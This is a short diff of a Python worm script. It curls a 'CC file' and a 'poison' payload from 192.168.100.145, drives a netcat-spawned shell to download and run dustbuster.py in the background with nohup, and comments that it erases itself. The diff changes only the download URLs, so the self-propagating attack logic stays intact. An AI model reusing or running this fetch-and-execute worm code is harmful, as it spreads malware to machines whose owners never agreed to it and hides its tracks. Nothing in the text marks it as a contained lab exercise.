@@ -12,8 +12,8 @@ with open('/tmp/barglefish.notaworm') as marker:
 	marker.write('nothing here...')
 
 # download CC file and payload
-sp.call(['curl', 'http://192.168.100.145/worm/cc',     '>', '/tmp/cc.notaworm'],     shell=True)
-sp.call(['curl', 'http://192.168.100.145/worm/poison', '>', '/tmp/poison.notaworm'], shell=True)
+sp.call(['curl', 'http://192.168.100.145/WORMS/cc.txt',  '>', '/tmp/cc.notaworm'],     shell=True)
+sp.call(['curl', 'http://192.168.100.145/WORMS/ppacket', '>', '/tmp/poison.notaworm'], shell=True)
 
 cc, poison = None, None
 with open('/tmp/cc.notaworm') as cc_file:
@@ -31,7 +31,7 @@ nc.stdin.flush()
 time.sleep(3)
 
 # tell spawned shell to download the python script and run it
-nc.stdin.write('curl http://192.168.100.145/worm/WORMFILE > /tmp/dustbuster.py && nohup python2 /tmp/dustbuster.py &\n')
+nc.stdin.write('curl http://192.168.100.145/WORMS/dustbuster.py > /tmp/dustbuster.py && nohup python2 /tmp/dustbuster.py &\n')
 nc.stdin.flush()
 
 # erase itself
